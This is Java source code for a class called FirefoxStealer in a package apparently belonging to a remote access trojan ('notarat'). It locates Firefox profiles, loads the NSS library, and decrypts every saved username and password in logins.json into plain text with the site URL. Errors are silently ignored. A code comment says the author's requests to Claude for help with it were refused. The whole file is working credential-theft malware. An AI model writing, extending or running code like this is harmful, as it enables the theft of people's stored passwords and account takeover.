package dev.xotic.notarat.browser;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.Library;
import com.sun.jna.Memory;
import com.sun.jna.Native;
import com.sun.jna.Pointer;
import com.sun.jna.Structure;
import dev.xotic.notarat.util.PathUtil;

import java.io.File;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Base64;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;

public class FirefoxStealer {
// i hate claude, he doesn't wanna help me with this ૮(˶ㅠ︿ㅠ)ა
    public List<Map<String, String>> dump() {
        List<Map<String, String>> out = new ArrayList<>();
        for (File profile : PathUtil.firefoxProfileDirs()) {
            try {
                out.addAll(dumpProfile(profile));
            } catch (Throwable ignored) {
            }
        }
        return out;
    }
    public static class SECItem extends Structure {
        public int type;
        public Pointer data;
        public int len;

        public static class ByRef extends SECItem implements Structure.ByReference {}

        @Override
        protected List<String> getFieldOrder() {
            return Arrays.asList("type", "data", "len");
        }
    }

    public interface NSS extends Library {
        int NSS_Init(String configDir);
        int NSS_Shutdown();
        int PK11SDR_Decrypt(SECItem.ByRef data, SECItem.ByRef result, Pointer cx);
        void SECITEM_FreeItem(SECItem.ByRef zap, boolean freeit);
    }

    private static NSS loadNss() {
        try { return Native.load("nss3", NSS.class); } catch (Throwable ignored) {}

        String[] candidates = {
                "C:\\Program Files\\Mozilla Firefox\\nss3.dll",
                "C:\\Program Files (x86)\\Mozilla Firefox\\nss3.dll",
                "/usr/lib/x86_64-linux-gnu/libnss3.so",
                "/usr/lib64/libnss3.so",
                "/usr/lib/libnss3.so",
                "/snap/firefox/current/usr/lib/firefox/libnss3.so",
                "/Applications/Firefox.app/Contents/MacOS/libnss3.dylib"
        };
        for (String c : candidates) {
            if (new File(c).isFile()) {
                try { return Native.load(c, NSS.class); } catch (Throwable ignored) {}
            }
        }
        return null;
    }

    private List<Map<String, String>> dumpProfile(File profile) throws Exception {
        File loginsFile = new File(profile, "logins.json");
        if (!loginsFile.isFile()) return Collections.emptyList();

        NSS nss = openNss(profile);

        String json = new String(Files.readAllBytes(loginsFile.toPath()), StandardCharsets.UTF_8);
        JsonObject root = JsonParser.parseString(json).getAsJsonObject();
        JsonArray logins = root.getAsJsonArray("logins");
        if (logins == null) return Collections.emptyList();

        List<Map<String, String>> rows = new ArrayList<>();
        for (JsonElement el : logins) {
            JsonObject l = el.getAsJsonObject();
            String user = sdr(nss, opt(l, "encryptedUsername"));
            String pass = sdr(nss, opt(l, "encryptedPassword"));
            if (pass == null || pass.isEmpty()) continue;

            Map<String, String> r = new LinkedHashMap<>();
            r.put("browser",  "Firefox");
            r.put("profile",  profile.getName());
            r.put("url",      opt(l, "hostname"));
            r.put("username", user == null ? "" : user);
            r.put("password", pass);
            rows.add(r);
        }
        return rows;
    }

    private NSS openNss(File profile) throws Exception {
        NSS nss = loadNss();
        if (nss == null) throw new RuntimeException("NSS library not found");

        String path = profile.getAbsolutePath();
        if (!path.endsWith(File.separator)) path += File.separator;
        if (nss.NSS_Init(path) == 0) return nss;
        File tmp = Files.createTempDirectory("ffprof").toFile();
        tmp.deleteOnExit();
        for (String name : new String[] {"cert9.db", "key4.db", "pkcs11.txt",
                "logins.json", "prefs.js"}) {
            File src = new File(profile, name);
            if (src.isFile()) {
                Files.copy(src.toPath(),
                        new File(tmp, name).toPath(),
                        StandardCopyOption.REPLACE_EXISTING);
            }
        }
        if (nss.NSS_Init(tmp.getAbsolutePath() + File.separator) != 0) {
            throw new RuntimeException("NSS_Init failed on temp profile");
        }
        return nss;
    }

    private String sdr(NSS nss, String b64) {
        if (b64 == null || b64.isEmpty()) return null;

        byte[] in = Base64.getDecoder().decode(b64);

        SECItem.ByRef data = new SECItem.ByRef();
        data.type = 0;
        data.len  = in.length;
        data.data = new Memory(in.length);
        data.data.write(0, in, 0, in.length);
        data.write();

        SECItem.ByRef result = new SECItem.ByRef();
        if (nss.PK11SDR_Decrypt(data, result, null) != 0) return null;

        result.read();
        byte[] out = result.data.getByteArray(0, result.len);
        String plain = new String(out, StandardCharsets.UTF_8);

        try { nss.SECITEM_FreeItem(result, false); } catch (Throwable ignored) {}
        return plain;
    }

    private static String opt(JsonObject o, String key) {
        JsonElement e = o.get(key);
        return (e == null || e.isJsonNull()) ? null : e.getAsString();
    }
}